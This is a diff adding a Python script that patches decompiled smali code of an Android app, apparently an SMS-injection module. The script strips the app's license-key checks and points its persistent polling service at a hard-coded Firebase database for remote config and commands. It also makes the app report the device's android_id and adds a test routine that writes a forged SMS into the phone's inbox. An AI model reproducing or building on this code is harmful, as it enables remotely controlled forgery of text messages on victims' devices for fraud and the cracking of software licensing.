@@ -1,0 +1,575 @@
+#!/usr/bin/env python3
+"""Make Virtus APK inject/poll flow match Astik module exactly."""
+
+from pathlib import Path
+
+ROOT = Path("/workspace/apk/virtus_decompiled/smali/com/virtus/module")
+MODULE_DB = "https://virtus-module-default-rtdb.firebaseio.com"
+
+
+def patch_telegram_polling_service() -> None:
+    path = ROOT / "TelegramPollingService.smali"
+    text = path.read_text()
+
+    # 1) MODULE_DB must be the Virtus module Firebase (Astik style)
+    text = text.replace(
+        '.field private static final MODULE_DB:Ljava/lang/String; = ""',
+        f'.field private static final MODULE_DB:Ljava/lang/String; = "{MODULE_DB}"',
+    )
+
+    # 2) firebaseBase default = MODULE_DB (Astik)
+    text = text.replace(
+        """    .line 56
+    const-string v1, ""
+
+    iput-object v1, p0, Lcom/virtus/module/TelegramPollingService;->firebaseBase:Ljava/lang/String;""",
+        f"""    .line 56
+    const-string v1, "{MODULE_DB}"
+
+    iput-object v1, p0, Lcom/virtus/module/TelegramPollingService;->firebaseBase:Ljava/lang/String;""",
+    )
+
+    # 3) pollOnce: empty-key check only (no LicenseKeyValidator) — Astik style
+    old_poll = """    move-result-object v3
+
+    .line 524
+    invoke-static {v3}, Lcom/virtus/module/LicenseKeyValidator;->isRegisteredKey(Ljava/lang/String;)Z
+
+    move-result v3
+
+    if-nez v3, :cond_0
+
+    goto/16 :goto_8
+
+    .line 526
+    :cond_0"""
+    new_poll = """    move-result-object v3
+
+    .line 524
+    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z
+
+    move-result v3
+
+    if-eqz v3, :cond_0
+
+    goto/16 :goto_8
+
+    .line 526
+    :cond_0"""
+    if old_poll not in text:
+        raise SystemExit("pollOnce validator block not found")
+    text = text.replace(old_poll, new_poll, 1)
+
+    # 4) processChild: remove LicenseKeyValidator gate (Astik injects immediately)
+    old_child = """    .line 369
+    :cond_1
+    :try_start_1
+    const-string v4, "virtus_module_prefs"
+
+    const/4 v5, 0x0
+
+    invoke-virtual {p0, v4, v5}, Lcom/virtus/module/TelegramPollingService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
+
+    move-result-object v4
+
+    const-string v5, "license_key"
+
+    const-string v6, ""
+
+    invoke-interface {v4, v5, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v4
+
+    invoke-static {v4}, Lcom/virtus/module/LicenseKeyValidator;->isRegisteredKey(Ljava/lang/String;)Z
+
+    move-result v4
+
+    if-nez v4, :cond_key_ok
+
+    monitor-exit p0
+
+    return-void
+
+    :cond_key_ok
+    const-string v4, "sender"
+"""
+    new_child = """    .line 369
+    :cond_1
+    :try_start_1
+    const-string v4, "sender"
+"""
+    if old_child not in text:
+        raise SystemExit("processChild validator block not found")
+    text = text.replace(old_child, new_child, 1)
+
+    # 5) readConfig: ALWAYS module DB config/{KEY}.json like Astik (no virtus_config fork)
+    old_read = """    .line 467
+    :try_start_0
+    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;
+
+    move-result-object p1
+
+    new-instance v5, Ljava/lang/StringBuilder;
+
+    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V
+
+    const-string v1, "firebaseio"
+
+    invoke-virtual {p1, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v1
+
+    if-nez v1, :virtus_cfg
+
+    const-string v1, "http"
+
+    invoke-virtual {p1, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z
+
+    move-result v1
+
+    if-nez v1, :virtus_cfg
+
+    const-string v1, "https://virtus-module-default-rtdb.firebaseio.com/config/"
+
+    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    const-string v1, ".json"
+
+    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    goto :virtus_url
+
+    :virtus_cfg
+    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    const-string v1, "/virtus_config.json"
+
+    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    :virtus_url
+    new-instance v4, Ljava/net/URL;
+
+    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object p1
+
+    invoke-direct {v4, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V"""
+
+    new_read = f"""    .line 467
+    :try_start_0
+    new-instance v4, Ljava/net/URL;
+
+    new-instance v5, Ljava/lang/StringBuilder;
+
+    invoke-direct {{v5}}, Ljava/lang/StringBuilder;-><init>()V
+
+    const-string v1, "{MODULE_DB}/config/"
+
+    invoke-virtual {{v5, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {{p1}}, Ljava/lang/String;->trim()Ljava/lang/String;
+
+    move-result-object p1
+
+    invoke-virtual {{v5, p1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    const-string p1, ".json"
+
+    invoke-virtual {{v5, p1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {{v5}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object p1
+
+    invoke-direct {{v4, p1}}, Ljava/net/URL;-><init>(Ljava/lang/String;)V"""
+
+    if old_read not in text:
+        raise SystemExit("readConfig URL builder not found")
+    text = text.replace(old_read, new_read, 1)
+
+    path.write_text(text)
+    print("TelegramPollingService.smali patched")
+
+
+def patch_process_child_outgoing() -> None:
+    """Remove OutgoingSmsSender gate — Astik inject-only processChild."""
+    path = ROOT / "TelegramPollingService.smali"
+    text = path.read_text()
+    old = """    .line 371
+    invoke-static {p0, v4, v5}, Lcom/virtus/module/OutgoingSmsSender;->trySendFromOutgoingBody(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
+
+    move-result v6
+
+    if-eqz v6, :cond_out_send
+
+    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->markConsumed(Ljava/lang/String;)V
+
+    monitor-exit p0
+
+    return-void
+
+    :cond_out_send
+    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z"""
+    new = """    .line 371
+    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z"""
+    if old in text:
+        text = text.replace(old, new, 1)
+        path.write_text(text)
+        print("processChild OutgoingSmsSender removed")
+    else:
+        print("processChild already Astik-style (skip)")
+
+
+def patch_read_config_reporter() -> None:
+    path = ROOT / "TelegramPollingService.smali"
+    text = path.read_text()
+    old = """    iput-object v4, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
+
+    invoke-static {v4, v4, v5}, Lcom/virtus/module/LicenseKeyReporter;->report(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
+
+    if-eqz v6, :cond_7"""
+    new = """    iput-object v4, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;
+
+    if-eqz v6, :cond_7"""
+    if old in text:
+        text = text.replace(old, new, 1)
+        path.write_text(text)
+        print("readConfig LicenseKeyReporter removed")
+    else:
+        print("readConfig reporter already removed (skip)")
+
+
+def patch_main_activity_3() -> None:
+    """Astik-style START SERVICE: toggle only, no key gate."""
+    path = ROOT / "MainActivity$3.smali"
+    path.write_text(
+        r""".class Lcom/virtus/module/MainActivity$3;
+.super Ljava/lang/Object;
+.source "MainActivity.java"
+
+# interfaces
+.implements Landroid/widget/CompoundButton$OnCheckedChangeListener;
+
+
+# annotations
+.annotation system Ldalvik/annotation/EnclosingMethod;
+    value = Lcom/virtus/module/MainActivity;->onCreate(Landroid/os/Bundle;)V
+.end annotation
+
+.annotation system Ldalvik/annotation/InnerClass;
+    accessFlags = 0x0
+    name = null
+.end annotation
+
+
+# instance fields
+.field final synthetic this$0:Lcom/virtus/module/MainActivity;
+
+
+# direct methods
+.method constructor <init>(Lcom/virtus/module/MainActivity;)V
+    .locals 0
+
+    iput-object p1, p0, Lcom/virtus/module/MainActivity$3;->this$0:Lcom/virtus/module/MainActivity;
+
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public onCheckedChanged(Landroid/widget/CompoundButton;Z)V
+    .locals 5
+
+    iget-object v0, p0, Lcom/virtus/module/MainActivity$3;->this$0:Lcom/virtus/module/MainActivity;
+
+    invoke-static {v0}, Lcom/virtus/module/MainActivity;->access$300(Lcom/virtus/module/MainActivity;)Z
+
+    move-result v1
+
+    if-eqz v1, :cond_0
+
+    return-void
+
+    :cond_0
+    invoke-static {v0}, Lcom/virtus/module/MainActivity;->access$400(Lcom/virtus/module/MainActivity;)Landroid/content/SharedPreferences;
+
+    move-result-object v1
+
+    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
+
+    move-result-object v1
+
+    const-string v2, "service_on"
+
+    invoke-interface {v1, v2, p2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;
+
+    move-result-object v1
+
+    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->apply()V
+
+    const/4 v1, 0x0
+
+    if-eqz p2, :cond_stop
+
+    iget-object p2, v0, Lcom/virtus/module/MainActivity;->keyInput:Landroid/widget/EditText;
+
+    invoke-virtual {p2}, Landroid/widget/EditText;->getText()Landroid/text/Editable;
+
+    move-result-object p2
+
+    invoke-virtual {p2}, Ljava/lang/Object;->toString()Ljava/lang/String;
+
+    move-result-object p2
+
+    invoke-virtual {p2}, Ljava/lang/String;->trim()Ljava/lang/String;
+
+    move-result-object p2
+
+    invoke-virtual {p2}, Ljava/lang/String;->isEmpty()Z
+
+    move-result v2
+
+    if-nez v2, :save_key
+
+    const-string p2, "Enter license key first"
+
+    invoke-static {v0, p2, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
+
+    move-result-object p2
+
+    invoke-virtual {p2}, Landroid/widget/Toast;->show()V
+
+    invoke-virtual {p1, v1}, Landroid/widget/CompoundButton;->setChecked(Z)V
+
+    return-void
+
+    :save_key
+    invoke-static {v0}, Lcom/virtus/module/MainActivity;->access$400(Lcom/virtus/module/MainActivity;)Landroid/content/SharedPreferences;
+
+    move-result-object p1
+
+    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
+
+    move-result-object p1
+
+    const-string v2, "license_key"
+
+    invoke-interface {p1, v2, p2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;
+
+    move-result-object p1
+
+    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V
+
+    new-instance p1, Landroid/content/Intent;
+
+    const-class v2, Lcom/virtus/module/TelegramPollingService;
+
+    invoke-direct {p1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    invoke-virtual {v0, p1}, Lcom/virtus/module/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
+    invoke-virtual {p2}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;
+
+    move-result-object p1
+
+    invoke-virtual {v0}, Lcom/virtus/module/MainActivity;->getContentResolver()Landroid/content/ContentResolver;
+
+    move-result-object v2
+
+    const-string v3, "android_id"
+
+    invoke-static {v2, v3}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v2
+
+    if-eqz v2, :toast_started
+
+    invoke-static {p1, p2, v2}, Lcom/virtus/module/LicenseKeyReporter;->report(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
+
+    :toast_started
+    const-string p1, "Service started \u2014 always alive"
+
+    invoke-static {v0, p1, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
+
+    move-result-object p1
+
+    invoke-virtual {p1}, Landroid/widget/Toast;->show()V
+
+    goto :goto_done
+
+    :cond_stop
+    new-instance p1, Landroid/content/Intent;
+
+    const-class p2, Lcom/virtus/module/TelegramPollingService;
+
+    invoke-direct {p1, v0, p2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    invoke-virtual {v0, p1}, Lcom/virtus/module/MainActivity;->stopService(Landroid/content/Intent;)Z
+
+    const-string p1, "Service stopped"
+
+    invoke-static {v0, p1, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
+
+    move-result-object p1
+
+    invoke-virtual {p1}, Landroid/widget/Toast;->show()V
+
+    :goto_done
+    invoke-static {v0}, Lcom/virtus/module/MainActivity;->access$500(Lcom/virtus/module/MainActivity;)V
+
+    return-void
+.end method
+"""
+    )
+    print("MainActivity$3.smali rewritten (Astik START SERVICE flow)")
+
+
+def patch_main_activity_4() -> None:
+    """Astik-style TEST INJECTION: inject CHACHA locally, no Firebase key gate."""
+    path = ROOT / "MainActivity$4.smali"
+    path.write_text(
+        r""".class Lcom/virtus/module/MainActivity$4;
+.super Ljava/lang/Object;
+.source "MainActivity.java"
+
+# interfaces
+.implements Ljava/lang/Runnable;
+
+
+# annotations
+.annotation system Ldalvik/annotation/EnclosingMethod;
+    value = Lcom/virtus/module/MainActivity;->runTest()V
+.end annotation
+
+.annotation system Ldalvik/annotation/InnerClass;
+    accessFlags = 0x0
+    name = null
+.end annotation
+
+
+# instance fields
+.field final synthetic this$0:Lcom/virtus/module/MainActivity;
+
+.field final synthetic val$act:Landroid/app/Activity;
+
+
+# direct methods
+.method constructor <init>(Lcom/virtus/module/MainActivity;Landroid/app/Activity;)V
+    .locals 0
+
+    iput-object p1, p0, Lcom/virtus/module/MainActivity$4;->this$0:Lcom/virtus/module/MainActivity;
+
+    iput-object p2, p0, Lcom/virtus/module/MainActivity$4;->val$act:Landroid/app/Activity;
+
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public run()V
+    .locals 3
+
+    :try_start_0
+    iget-object v0, p0, Lcom/virtus/module/MainActivity$4;->val$act:Landroid/app/Activity;
+
+    const-string v1, "CHACHA"
+
+    const-string v2, "Chacha Ji Pani Pila Do?"
+
+    invoke-static {v0, v1, v2}, Lcom/virtus/module/SmsInjector;->inject(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
+
+    move-result v0
+
+    if-eqz v0, :cond_0
+
+    const-string v0, "OK \u2014 SMS injected"
+
+    goto :goto_0
+
+    :cond_0
+    const-string v0, "FAILED"
+
+    :goto_0
+    iget-object v1, p0, Lcom/virtus/module/MainActivity$4;->val$act:Landroid/app/Activity;
+
+    new-instance v2, Lcom/virtus/module/MainActivity$4$1;
+
+    invoke-direct {v2, p0, v0}, Lcom/virtus/module/MainActivity$4$1;-><init>(Lcom/virtus/module/MainActivity$4;Ljava/lang/String;)V
+
+    invoke-virtual {v1, v2}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    return-void
+
+    :catch_0
+    move-exception v0
+
+    iget-object v1, p0, Lcom/virtus/module/MainActivity$4;->val$act:Landroid/app/Activity;
+
+    new-instance v2, Lcom/virtus/module/MainActivity$4$2;
+
+    invoke-direct {v2, p0, v0}, Lcom/virtus/module/MainActivity$4$2;-><init>(Lcom/virtus/module/MainActivity$4;Ljava/lang/Exception;)V
+
+    invoke-virtual {v1, v2}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V
+
+    return-void
+.end method
+"""
+    )
+    print("MainActivity$4.smali rewritten (Astik TEST inject)")
+
+
+def patch_main_activity_run_test() -> None:
+    path = ROOT / "MainActivity.smali"
+    text = path.read_text()
+    old = """    .line 289
+    :cond_0
+    invoke-static {v0}, Lcom/virtus/module/LicenseKeyValidator;->isRegisteredKey(Ljava/lang/String;)Z
+
+    move-result v1
+
+    if-nez v1, :cond_valid_key
+
+    const-string v0, "Invalid KEY \u2014 admin se valid key lo"
+
+    const/4 v1, 0x1
+
+    invoke-static {p0, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
+
+    move-result-object v0
+
+    invoke-virtual {v0}, Landroid/widget/Toast;->show()V
+
+    return-void
+
+    .line 290
+    :cond_valid_key
+    iget-object v1, p0, Lcom/virtus/module/MainActivity;->prefs:Landroid/content/SharedPreferences;"""
+    new = """    .line 290
+    :cond_0
+    iget-object v1, p0, Lcom/virtus/module/MainActivity;->prefs:Landroid/content/SharedPreferences;"""
+    if old not in text:
+        raise SystemExit("MainActivity.runTest validator block not found")
+    path.write_text(text.replace(old, new, 1))
+    print("MainActivity.smali runTest patched")
+
+
+def main() -> None:
+    patch_telegram_polling_service()
+    patch_process_child_outgoing()
+    patch_read_config_reporter()
+    patch_main_activity_3()
+    patch_main_activity_4()
+    patch_main_activity_run_test()
+    print("DONE — Virtus APK now follows Astik inject flow")
+
+
+if __name__ == "__main__":
+    main()
